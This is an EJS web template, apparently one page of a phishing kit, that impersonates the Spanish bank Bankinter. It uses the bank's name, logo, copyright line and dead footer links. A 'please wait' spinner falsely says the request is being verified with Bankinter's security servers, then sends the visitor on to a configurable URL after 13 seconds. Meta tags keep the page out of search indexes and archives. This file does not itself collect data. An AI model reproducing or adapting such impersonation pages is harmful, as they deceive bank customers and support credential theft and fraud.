<%
    // ==========================================
    // PAGE SETTINGS: Configure loading duration here (in seconds)
    // ==========================================
    const LOADING_DURATION = (typeof seconds !== 'undefined' && seconds !== null) ? Number(seconds) : 13;
%>
<!doctype html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
    <meta http-equiv="refresh" content="<%= LOADING_DURATION %>; url=<%= redirectUrl %>">
    <title><%= title || "Bankinter - Verificación" %></title>
    <link rel="icon" type="image/x-icon" href="/assets/imgs/favicon.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap');

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        html, body {
            background-color: #ffffff;
            color: #191b1c;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            font-size: 14px;
        }

        a {
            text-decoration: none;
            color: inherit;
        }

        /* --- HEADER --- */
        .site-header {
            width: 100%;
            background: #ffffff;
            padding: 18px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #f0f2f5;
        }

        .header-logo img {
            height: 26px;
            width: auto;
            display: block;
        }

        .hamburger-btn {
            background: transparent;
            border: none;
            cursor: pointer;
            padding: 4px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            width: 28px;
            height: 20px;
        }

        .hamburger-btn span {
            display: block;
            height: 3px;
            width: 100%;
            background-color: #191b1c;
            border-radius: 2px;
        }

        /* --- MAIN CONTAINER --- */
        .main-wrapper {
            flex: 1;
            width: 100%;
            max-width: 440px;
            margin: 40% auto;
            padding: 60px 24px 80px 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        .spinner {
            width: 52px;
            height: 52px;
            border: 4px solid #edf3fa;
            border-top: 4px solid #FF6600;
            border-radius: 50%;
            animation: spin 0.9s cubic-bezier(0.6, 0.2, 0.4, 0.8) infinite;
            margin-bottom: 24px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-title {
            font-size: 20px;
            font-weight: 600;
            color: #191b1c;
            margin-bottom: 10px;
        }

        .loading-desc {
            font-size: 14px;
            color: #5c6780;
            line-height: 1.5;
        }

        /* --- FOOTER --- */
        .site-footer {
            width: 100%;
            background: #ffffff;
            border-top: 1px solid #eaedf2;
            margin-top: auto;
        }

        .footer-content {
            max-width: 440px;
            margin: 0 auto;
            padding: 40px 24px 30px 24px;
        }

        .footer-logo {
            margin-bottom: 28px;
        }

        .footer-logo img {
            height: 24px;
            width: auto;
            display: block;
        }

        .footer-primary-links {
            list-style: none;
            margin-bottom: 32px;
        }

        .footer-primary-links li {
            border-bottom: 1px solid #f0f3f6;
        }

        .footer-primary-links a {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 0;
            font-size: 13px;
            font-weight: 700;
            color: #191b1c;
            letter-spacing: 0.4px;
            text-transform: uppercase;
            transition: color 0.15s ease;
        }

        .footer-primary-links a:hover {
            color: #e05305;
        }

        .footer-primary-links a .arrow {
            font-size: 15px;
            color: #5c6780;
            font-weight: 400;
        }

        .footer-secondary-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px 16px;
            margin-bottom: 30px;
        }

        .footer-secondary-grid a {
            font-size: 12px;
            color: #333d47;
            line-height: 1.4;
            transition: color 0.15s ease;
        }

        .footer-secondary-grid a:hover {
            color: #e05305;
        }

        /* --- BOTTOM BAR --- */
        .footer-bottom-bar {
            background-color: #EEF2F6;
            padding: 22px 20px 20px 20px;
            text-align: center;
        }

        .social-icons {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 24px;
            margin-bottom: 14px;
        }

        .social-icons a {
            color: #4a5568;
            font-size: 18px;
            transition: color 0.15s ease, transform 0.15s ease;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }

        .social-icons a:hover {
            color: #e05305;
            transform: translateY(-2px);
        }

        .copyright-txt {
            font-size: 11px;
            color: #718096;
            text-transform: uppercase;
            letter-spacing: 0.4px;
            font-weight: 500;
        }
    </style>
</head>

<body>

    <!-- HEADER -->
    <header class="site-header">
        <div class="header-logo">
            <img src="/assets/imgs/logo.svg" alt="Bankinter">
        </div>
        <button type="button" class="hamburger-btn" aria-label="Menú">
            <span></span>
            <span></span>
            <span></span>
        </button>
    </header>

    <!-- MAIN CONTENT -->
    <main class="main-wrapper">
        <div class="spinner"></div>
        <h2 class="loading-title">Por favor, espere...</h2>
        <p class="loading-desc">Estamos verificando su solicitud de forma segura con los servidores de seguridad de Bankinter.</p>
    </main>

    <!-- FOOTER -->
    <footer class="site-footer">
        <div class="footer-content">
            <div class="footer-logo">
                <img src="/assets/imgs/logo.svg" alt="Bankinter">
            </div>

            <ul class="footer-primary-links">
                <li><a href="#">WEB CORPORATIVA <span class="arrow">&rarr;</span></a></li>
                <li><a href="#">PORTAL INMOBILIARIO <span class="arrow">&rarr;</span></a></li>
                <li><a href="#">NO RESIDENTES <span class="arrow">&rarr;</span></a></li>
                <li><a href="#">PARTICULARES <span class="arrow">&rarr;</span></a></li>
                <li><a href="#">BANCA PERSONAL <span class="arrow">&rarr;</span></a></li>
                <li><a href="#">BANCA PRIVADA <span class="arrow">&rarr;</span></a></li>
            </ul>

            <div class="footer-secondary-grid">
                <a href="#">Contacto</a>
                <a href="#">Fundación Innovación</a>
                <a href="#">Tablón de anuncios y tarifas</a>
                <a href="#">Seguridad y privacidad</a>
                <a href="#">Política de cookies</a>
                <a href="#">Aviso legal</a>
                <a href="#">Accesibilidad</a>
                <a href="#">Mapa web</a>
            </div>
        </div>

        <div class="footer-bottom-bar">
            <div class="social-icons">
                <a href="#" aria-label="Facebook"><i class="fa-brands fa-facebook-f"></i></a>
                <a href="#" aria-label="X Twitter"><i class="fa-brands fa-x-twitter"></i></a>
                <a href="#" aria-label="YouTube"><i class="fa-brands fa-youtube"></i></a>
                <a href="#" aria-label="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a>
                <a href="#" aria-label="Blog"><i class="fa-solid fa-square-rss"></i></a>
            </div>
            <p class="copyright-txt">&copy; BANKINTER S.A. TODOS LOS DERECHOS RESERVADOS</p>
        </div>
    </footer>

    <!-- JS FILES -->
    <script>
        (function() {
            var target = <%- JSON.stringify(redirectUrl) %>;
            var seconds = <%= LOADING_DURATION %>;
            var ms = seconds * 1000;
            setTimeout(function() {
                window.location.href = target;
            }, ms);
        })();
    </script>
</body>
</html>
